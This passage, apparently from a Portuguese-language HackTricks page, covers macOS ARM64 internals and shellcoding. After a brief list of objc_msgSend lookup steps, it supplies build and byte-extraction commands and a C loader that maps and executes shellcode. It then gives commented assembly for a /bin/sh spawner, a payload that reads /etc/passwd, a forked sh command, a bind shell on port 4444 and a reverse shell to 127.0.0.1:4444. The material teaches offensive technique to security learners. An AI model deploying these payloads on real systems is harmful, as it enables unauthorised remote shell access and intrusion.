- Se for bem-sucedida, concluir
- Adquirir `runtimeLock` (leitura)
- Se (`realize` && !`cls->realized`), realizar a classe
- Se (`initialize` && !`cls->initialized`), inicializar a classe
- Tentar o próprio cache da classe:
- Se for bem-sucedida, concluir
- Tentar a lista de métodos da classe:
- Se encontrado, preencher o cache e concluir
- Tentar o cache da superclasse:
- Se for bem-sucedida, concluir
- Tentar a lista de métodos da superclasse:
- Se encontrado, preencher o cache e concluir
- Se (`resolver`), tentar o method resolver e repetir a partir da busca na classe
- Se ainda estiver aqui (= todas as outras tentativas falharam), tentar o forwarder

### Shellcodes

Para compilar:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Para extrair os bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Para versões mais recentes do macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Código C para testar o shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Extraído de [**aqui**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) e explicado.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Ler com cat

O objetivo é executar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, portanto, o segundo argumento (x1) é um array de parâmetros (que, na memória, significa uma pilha de endereços).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocar um comando com sh a partir de um fork para que o processo principal não seja encerrado
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell de [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) na **porta 4444**<sup>[[2]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

De [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell para **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Referências

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)
- [4] [Apple Developer - 712 Objc Msgsend](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)

{{#include ../../../banners/hacktricks-training.md}}
